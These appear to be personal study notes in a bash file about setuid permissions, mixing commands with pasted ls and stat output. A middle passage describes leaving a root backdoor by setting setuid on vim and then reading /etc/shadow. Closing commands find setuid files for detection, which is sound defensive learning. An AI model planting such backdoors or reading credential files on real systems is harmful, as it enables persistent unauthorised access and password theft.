#!/bin/bash

# A program which is executed with permissions from another user than the one you are logged in
# example: /bin/su --> The su permission is executed by root : root

israel@israel-N56JN:~$ ls -lah /bin/su
-rwsr-xr-x 1 root root 40K Mai 17  2017 /bin/su

# Scenario where you can create a backdoor
# You have access as root in one machine, but is just a temporary privilege, you can leave a backdoor with setuid
# vim binary, or nano are owned by root:root, setting up a setuid would mean you edit any file with root privileges
# because it would be like root running vim, therefore, you could edit /etc/shadow pam.d module files, and so on...

-rwxr-xr-x. 1 root root 2.2M Aug  2  2017 /usr/bin/vim

sudo chmod u+s /usr/bin/vim
# or:
sudo chmod u+s $(which vim)

-rwsr-xr-x. 1 root root 2.2M Aug  2  2017 /usr/bin/vim

# stat vim file:


  File: ‘/usr/bin/vim’
  Size: 2289640   	Blocks: 4472       IO Block: 4096   regular file
Device: fd00h/64768d	Inode: 26825343    Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Context: system_u:object_r:bin_t:s0
Access: 2018-06-06 17:19:38.630791884 +0200
Modify: 2017-08-02 02:45:59.000000000 +0200
Change: 2018-06-07 12:54:51.974275097 +0200
 Birth: -

# now with this backdoor, it is possible to check for passwords:
vim /etc/shadow # with root privileges, therefore it can be read, redirect to output file, and so on ...

# the best is creating a script which detects setuid in binary files, so that we keep control of potential risks

# like this you can find setuid files
sudo find / -type f -perm -u=s 2>/dev/null
# or:
sudo find / -type f -perm 4000 -print 2>/dev/null


